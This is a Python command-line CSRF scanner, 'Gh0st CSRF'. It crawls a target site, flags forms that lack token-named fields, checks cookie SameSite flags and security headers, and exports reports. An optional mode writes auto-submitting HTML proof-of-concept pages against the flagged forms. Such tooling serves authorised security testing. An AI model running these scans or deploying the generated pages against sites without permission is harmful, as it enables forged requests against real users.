#!/usr/bin/env python3
"""Gh0st CSRF — A modern CSRF vulnerability scanner."""

import argparse
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup

# ──────────────────────────── constants ────────────────────────────

BANNER = r"""
              ________    ____       __     ___________ ____  ______
             / ____/ /_  / __ \_____/ /_   / ____/ ___// __ \/ ____/
            / / __/ __ \/ / / / ___/ __/  / /    \__ \/ /_/ / /_    
           / /_/ / / / / /_/ (__  ) /_   / /___ ___/ / _, _/ __/    
           \____/_/ /_/\____/____/\__/   \____//____/_/ |_/_/       
              ║║      By g h 0 s t _ r i 1 3 y       ║║
"""

CSRF_TOKEN_KEYWORDS = frozenset([
    "csrf", "xsrf", "token", "_token", "authenticity_token",
    "csrfmiddlewaretoken", "__requestverificationtoken", "antiforgery",
])

DEFAULT_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    )
}

REQUEST_TIMEOUT = 10  # seconds
MAX_WORKERS = 5

# ──────────────────────────── colours ──────────────────────────────

class Color:
    """ANSI escape codes for terminal colouring."""
    RESET  = "\033[0m"
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"


def _info(msg: str) -> None:
    print(f"  {Color.CYAN}⟬⁕⟭{Color.RESET} {msg}")


def _ok(msg: str) -> None:
    print(f"  {Color.GREEN}⟬✓⟭{Color.RESET} {msg}")


def _warn(msg: str) -> None:
    print(f"  {Color.YELLOW}⟬⁈⟭{Color.RESET} {msg}")


def _fail(msg: str) -> None:
    print(f"  {Color.RED}⟬✕⟭{Color.RESET} {msg}")


def _arrow(msg: str) -> None:
    print(f"    {Color.BOLD}⟬→⟭{Color.RESET} {msg}")

# ──────────────────────────── networking ───────────────────────────

def fetch(url: str, session: requests.Session) -> requests.Response | None:
    """GET *url* with retries, timeout, and friendly error messages."""
    for attempt in range(1, 4):
        try:
            resp = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
            resp.raise_for_status()
            return resp
        except requests.RequestException as exc:
            if attempt == 3:
                _fail(f"Failed to fetch {url}: {exc}")
    return None

# ──────────────────────────── form parsing ─────────────────────────

def _parse_forms(html: str, base_url: str) -> list[dict]:
    """Extract every <form> from *html* and return structured data."""
    soup = BeautifulSoup(html, "html.parser")
    forms: list[dict] = []

    for form_tag in soup.find_all("form"):
        action = form_tag.get("action", "")
        method = (form_tag.get("method") or "get").lower()

        inputs = []
        for inp in form_tag.find_all(["input", "textarea", "select"]):
            inputs.append({
                "tag":   inp.name,
                "type":  inp.get("type", "text"),
                "name":  inp.get("name"),
                "value": inp.get("value", ""),
            })

        forms.append({
            "action":  urljoin(base_url, action),
            "method":  method,
            "inputs":  inputs,
        })

    return forms


def _extract_links(html: str, base_url: str) -> list[str]:
    """Return a deduplicated list of same-origin links found in *html*."""
    soup = BeautifulSoup(html, "html.parser")
    base_netloc = urlparse(base_url).netloc
    links: list[str] = []

    for anchor in soup.find_all("a", href=True):
        href = anchor["href"]
        parsed = urlparse(href)
        if not parsed.netloc or parsed.netloc == base_netloc:
            full = urljoin(base_url, href)
            if full not in links:
                links.append(full)

    return links

# ──────────────────────────── crawler ──────────────────────────────

def crawl(
    start_url: str,
    depth: int = 2,
    session: requests.Session | None = None,
    max_workers: int = MAX_WORKERS,
) -> list[dict]:
    """
    Crawl *start_url* up to *depth* levels deep, collecting every HTML form.
    Uses a thread pool for concurrent page fetching.
    """
    session = session or _make_session()
    visited: set[str] = set()
    all_forms: list[dict] = []
    current_layer = [start_url]

    for current_depth in range(depth):
        next_layer: list[str] = []
        urls_to_fetch = [u for u in current_layer if u not in visited]

        if not urls_to_fetch:
            break

        _info(
            f"Depth {current_depth + 1}/{depth} — "
            f"fetching {len(urls_to_fetch)} page(s)…"
        )

        with ThreadPoolExecutor(max_workers=max_workers) as pool:
            future_to_url = {
                pool.submit(fetch, url, session): url
                for url in urls_to_fetch
            }

            for future in as_completed(future_to_url):
                url = future_to_url[future]
                visited.add(url)
                resp = future.result()
                if resp is None:
                    continue

                forms = _parse_forms(resp.text, url)
                all_forms.extend(forms)

                if current_depth + 1 < depth:
                    for link in _extract_links(resp.text, url):
                        if link not in visited:
                            next_layer.append(link)

        current_layer = list(set(next_layer))

    return all_forms

# ──────────────────────────── analysis ─────────────────────────────

def _has_csrf_token(form: dict) -> bool:
    """Return True if the form contains an input whose name hints at a CSRF token."""
    for inp in form["inputs"]:
        name = (inp.get("name") or "").lower()
        if any(keyword in name for keyword in CSRF_TOKEN_KEYWORDS):
            return True
    return False


def _check_samesite_cookies(url: str, session: requests.Session) -> list[dict]:
    """Check whether cookies set by *url* use the SameSite attribute."""
    results = []
    resp = fetch(url, session)
    if resp is None:
        return results

    for cookie in session.cookies:
        same_site = getattr(cookie, "same_site", None) or "not set"
        results.append({
            "name":      cookie.name,
            "domain":    cookie.domain,
            "same_site": same_site,
            "secure":    cookie.secure,
            "httponly":   bool(getattr(cookie, "httponly", False)),
        })
    return results


def _check_headers(url: str, session: requests.Session) -> dict:
    """Check response headers relevant to CSRF protection."""
    resp = fetch(url, session)
    if resp is None:
        return {}
    headers = resp.headers
    return {
        "x-frame-options":           headers.get("X-Frame-Options", "missing"),
        "content-security-policy":   headers.get("Content-Security-Policy", "missing"),
        "strict-transport-security": headers.get("Strict-Transport-Security", "missing"),
    }


def analyse_forms(forms: list[dict]) -> tuple[list[dict], list[dict]]:
    """Split forms into (vulnerable, protected) based on CSRF-token presence."""
    vulnerable, protected = [], []
    for form in forms:
        (protected if _has_csrf_token(form) else vulnerable).append(form)
    return vulnerable, protected

# ──────────────────────── PoC generator ────────────────────────────

def generate_poc(form: dict) -> str:
    """Return a self-submitting HTML page that exploits the missing CSRF token."""
    inputs_html = "\n        ".join(
        f'<input type="hidden" name="{inp["name"]}" value="{inp["value"]}" />'
        for inp in form["inputs"]
        if inp.get("name")
    )
    return f"""\
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>CSRF PoC</title></head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <form id="csrf-form" action="{form["action"]}" method="{form["method"]}">
        {inputs_html}
        <input type="submit" value="Submit" />
    </form>
    <script>document.getElementById("csrf-form").submit();</script>
</body>
</html>"""

# ──────────────────────── report export ────────────────────────────

def export_json(data: dict, path: Path) -> None:
    path.write_text(json.dumps(data, indent=2), encoding="utf-8")
    _ok(f"JSON report saved → {path}")


def export_html(data: dict, path: Path) -> None:
    rows = ""
    for f in data.get("vulnerable_forms", []):
        rows += (
            f"<tr><td>{f['action']}</td>"
            f"<td>{f['method'].upper()}</td>"
            f"<td>{len(f['inputs'])}</td></tr>\n"
        )
    html = f"""\
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Gh0st CSRF — Scan Report</title>
<style>
  body {{ font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 2rem; }}
  h1 {{ color: #58a6ff; }}
  table {{ border-collapse: collapse; width: 100%; margin-top: 1rem; }}
  th, td {{ border: 1px solid #30363d; padding: .6rem 1rem; text-align: left; }}
  th {{ background: #161b22; color: #8b949e; }}
  tr:nth-child(even) {{ background: #161b22; }}
  .stat {{ display: inline-block; margin-right: 2rem; }}
  .stat span {{ font-size: 1.5rem; font-weight: bold; color: #f85149; }}
</style>
</head>
<body>
<h1>Gh0st CSRF — Scan Report</h1>
<p>
  <span class="stat">Target: <strong>{data.get("target", "")}</strong></span>
  <span class="stat">Depth: <strong>{data.get("depth", "")}</strong></span>
</p>
<p>
  <span class="stat">Total forms: <span>{data.get("total_forms", 0)}</span></span>
  <span class="stat">Vulnerable: <span>{data.get("vulnerable_count", 0)}</span></span>
  <span class="stat">Protected: <span>{data.get("protected_count", 0)}</span></span>
</p>
<h2>Vulnerable Forms</h2>
<table>
  <thead><tr><th>Action</th><th>Method</th><th>Inputs</th></tr></thead>
  <tbody>{rows if rows else "<tr><td colspan='3'>None found 🎉</td></tr>"}</tbody>
</table>
</body>
</html>"""
    path.write_text(html, encoding="utf-8")
    _ok(f"HTML report saved → {path}")

# ──────────────────────── session helper ───────────────────────────

def _make_session() -> requests.Session:
    session = requests.Session()
    session.headers.update(DEFAULT_HEADERS)
    return session

# ──────────────────────────── main ─────────────────────────────────

def main() -> None:
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="Gh0st CSRF — A modern CSRF vulnerability scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("-u", "--url",    required=True, help="Target URL to scan")
    parser.add_argument("--depth",        type=int, default=2, help="Crawl depth (default: 2)")
    parser.add_argument("-o", "--output", type=str, default=None, help="Export report (json/html), e.g. report.json")
    parser.add_argument("--poc",          action="store_true", help="Generate PoC HTML files for vulnerable forms")
    parser.add_argument("--threads",      type=int, default=MAX_WORKERS, help=f"Concurrent workers (default: {MAX_WORKERS})")
    args = parser.parse_args()

    threads = args.threads

    target = args.url
    if not target.startswith(("http://", "https://")):
        _warn("Please provide a valid URL (starting with http:// or https://)")
        sys.exit(1)

    session = _make_session()

    # ── crawl ──
    _info(f"Target  : {Color.BOLD}{target}{Color.RESET}")
    _info(f"Depth   : {args.depth}")
    _info(f"Threads : {threads}")
    print()

    start = time.perf_counter()
    forms = crawl(target, depth=args.depth, session=session, max_workers=threads)
    elapsed = time.perf_counter() - start

    if not forms:
        _warn("No forms found on the target.")
        sys.exit(0)

    _ok(f"Discovered {len(forms)} form(s) in {elapsed:.2f}s")
    print()

    # ── analyse ──
    _info("Analysing forms for CSRF protection…")
    vulnerable, protected = analyse_forms(forms)

    # ── cookie & header checks ──
    _info("Checking cookies & security headers…")
    cookies = _check_samesite_cookies(target, session)
    sec_headers = _check_headers(target, session)
    print()

    # ── results ──
    if vulnerable:
        _fail(
            f"{Color.BOLD}{len(vulnerable)}{Color.RESET} "
            f"form(s) {Color.RED}vulnerable{Color.RESET} to CSRF:"
        )
        for form in vulnerable:
            _arrow(
                f"{Color.YELLOW}{form['method'].upper()}{Color.RESET}  "
                f"{form['action']}"
            )
    else:
        _ok("No CSRF vulnerabilities found — all forms are protected!")

    if protected:
        _ok(f"{len(protected)} form(s) have CSRF tokens.")

    # ── cookie report ──
    if cookies:
        print()
        _info("Cookie analysis:")
        for c in cookies:
            flag = Color.GREEN if c["same_site"].lower() in ("strict", "lax") else Color.RED
            _arrow(
                f"{c['name']}  SameSite={flag}{c['same_site']}{Color.RESET}  "
                f"Secure={c['secure']}  HttpOnly={c['httponly']}"
            )

    # ── header report ──
    if sec_headers:
        print()
        _info("Security headers:")
        for hdr, val in sec_headers.items():
            colour = Color.RED if val == "missing" else Color.GREEN
            _arrow(f"{hdr}: {colour}{val}{Color.RESET}")

    # ── PoC generation ──
    if args.poc and vulnerable:
        print()
        poc_dir = Path("poc_output")
        poc_dir.mkdir(exist_ok=True)
        for i, form in enumerate(vulnerable, 1):
            poc_path = poc_dir / f"csrf_poc_{i}.html"
            poc_path.write_text(generate_poc(form), encoding="utf-8")
            _ok(f"PoC #{i} saved → {poc_path}")

    # ── export ──
    report_data = {
        "target":           target,
        "depth":            args.depth,
        "total_forms":      len(forms),
        "vulnerable_count": len(vulnerable),
        "protected_count":  len(protected),
        "vulnerable_forms": vulnerable,
        "protected_forms":  protected,
        "cookies":          cookies,
        "security_headers": sec_headers,
    }

    if args.output:
        out_path = Path(args.output)
        if out_path.suffix == ".json":
            export_json(report_data, out_path)
        elif out_path.suffix in (".html", ".htm"):
            export_html(report_data, out_path)
        else:
            _warn("Unsupported output format. Use .json or .html")

    print()
    _ok(f"{Color.BOLD}Scan complete.{Color.RESET}")


if __name__ == "__main__":
    main()
